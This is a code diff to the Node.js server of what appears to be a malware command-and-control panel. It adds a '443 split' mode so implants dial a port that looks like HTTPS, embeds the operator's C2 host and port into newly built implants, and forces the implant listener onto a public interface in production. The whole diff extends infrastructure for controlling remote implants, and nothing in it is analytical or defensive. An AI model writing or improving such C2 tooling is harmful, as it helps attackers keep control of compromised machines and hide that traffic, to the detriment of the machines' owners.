@@ -1604,26 +1604,69 @@ function resolveBuildC2Host(req) {
   return '';
 }
 
+function is443SplitEnabled() {
+  const v = process.env.ENABLE_443_SPLIT;
+  return v === '1' || v === 'true' || v === 'yes';
+}
+
 function getImplantListenPort(settings) {
   const httpPort = Number(process.env.PORT || 5000);
-  const raw = Number(
-    process.env.TCP_PORT ||
-    (settings && settings.serverPort) ||
-    2026
-  );
+  let raw;
+  if (is443SplitEnabled()) {
+    raw = Number(process.env.PLAIN_PORT || process.env.TCP_PORT || 1443);
+  } else {
+    raw = Number(
+      process.env.TCP_PORT ||
+      (settings && settings.serverPort) ||
+      2026
+    );
+  }
   return resolveImplantTcpPort(raw, httpPort);
 }
 
-/** Port embedded in new implants — always the port the TCP listener actually uses */
+let buildC2PortMismatchWarned = false;
+
+/**
+ * Port embedded in new implants.
+ * With ENABLE_443_SPLIT: clients dial BUILD_C2_PORT/SPLIT_PORT (e.g. 443); Node listens PLAIN_PORT (e.g. 1443).
+ */
 function resolveBuildC2Port(settings) {
   const listen = getImplantListenPort(settings);
+  if (is443SplitEnabled()) {
+    const embed = Number(process.env.BUILD_C2_PORT || process.env.SPLIT_PORT || 443);
+    if (Number.isFinite(embed) && embed > 0 && embed < 65536) return embed;
+    return listen;
+  }
   const explicit = Number(process.env.BUILD_C2_PORT);
-  if (Number.isFinite(explicit) && explicit > 0 && explicit < 65536 && explicit !== listen) {
+  if (
+    !buildC2PortMismatchWarned &&
+    Number.isFinite(explicit) &&
+    explicit > 0 &&
+    explicit < 65536 &&
+    explicit !== listen
+  ) {
+    buildC2PortMismatchWarned = true;
     console.warn(
-      `[C2] BUILD_C2_PORT=${explicit} ignored — implant listener is on ${listen}. Open firewall for ${listen} and rebuild implants.`
+      `[C2] BUILD_C2_PORT=${explicit} ignored — implant listener is on ${listen}. Set BUILD_C2_PORT=${listen} in .env and rebuild implants.`
     );
   }
   return listen;
+}
+
+function getImplantTcpBindHost(settings) {
+  let host = String(process.env.TCP_HOST || '').trim();
+  if (!host) host = String((settings && settings.serverHost) || '0.0.0.0').trim();
+  const isProd = (process.env.APP_ENV || 'local') !== 'local';
+  if (isProd && (!host || host === '127.0.0.1' || host === 'localhost' || host === '::1')) {
+    console.warn(
+      `[TCP] serverHost/TCP_HOST was ${host || '(empty)'} — remote implants cannot connect. Binding implant TCP on 0.0.0.0 instead.`
+    );
+    host = '0.0.0.0';
+    try {
+      setSettings({ serverHost: '0.0.0.0' });
+    } catch (_) {}
+  }
+  return host;
 }
 
 function getTcpListenInfo() {
@@ -1689,7 +1732,7 @@ async function restartTcpServerIfNeeded(newHost, newPort) {
     await loadDb();
     ensureDefaultSettings();
     const s = getAllSettings();
-    const tcpHost = process.env.TCP_HOST || s.serverHost || '0.0.0.0';
+    const tcpHost = getImplantTcpBindHost(s);
     const tcpPort = getImplantListenPort(s);
     if (process.env.TCP_PORT) {
       setSettings({ serverPort: tcpPort });
@@ -1697,6 +1740,11 @@ async function restartTcpServerIfNeeded(newHost, newPort) {
     const embedHost = resolveBuildC2Host();
     const embedPort = resolveBuildC2Port(s);
     console.log(`[C2] Implant TCP bind ${tcpHost}:${tcpPort}`);
+    if (is443SplitEnabled()) {
+      console.log(
+        `[C2] 443 split: implants dial ${embedHost || '?'}:${embedPort} → must forward public ${embedPort} to local ${tcpPort} (PLAIN_PORT)`
+      );
+    }
     console.log(`[C2] Builder embed target ${embedHost || '(unset — set BUILD_C2_HOST)'}:${embedPort}`);
     if (!embedHost && (process.env.APP_ENV || 'local') !== 'local') {
       console.warn('[C2] BUILD_C2_HOST unset in production — set your VPS IP/domain or implants will not reach this server.');
@@ -2353,7 +2401,7 @@ app.put('/api/settings', async (req, res) => {
   // Hot-restart TCP server if host/port changed
   const s = getAllSettings();
   try {
-    await restartTcpServerIfNeeded(s.serverHost || '0.0.0.0', getImplantListenPort(s));
+    await restartTcpServerIfNeeded(getImplantTcpBindHost(s), getImplantListenPort(s));
     res.json({ ok: true });
   } catch (e) {
     console.error('Failed to restart TCP server:', e.message);
